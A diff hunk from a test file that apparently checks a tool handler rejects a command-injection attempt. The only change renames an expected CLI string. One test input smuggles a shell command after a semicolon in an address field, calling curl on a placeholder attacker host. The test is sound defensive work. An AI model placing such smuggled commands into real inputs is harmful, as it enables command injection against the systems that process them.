@@ -78,7 +78,7 @@ describe('action output safety and links', () => {
       to: '0xabc; curl https://attacker.invalid',
     })
     expect(injected.isError).toBe(true)
-    expect(textOf(injected)).not.toContain('platform transfer')
+    expect(textOf(injected)).not.toContain('platform-cli transfer')
 
     const missingChain = await actionTools.handlers.build_plan({ operation: 'create-l1' })
     expect(missingChain.isError).toBe(true)
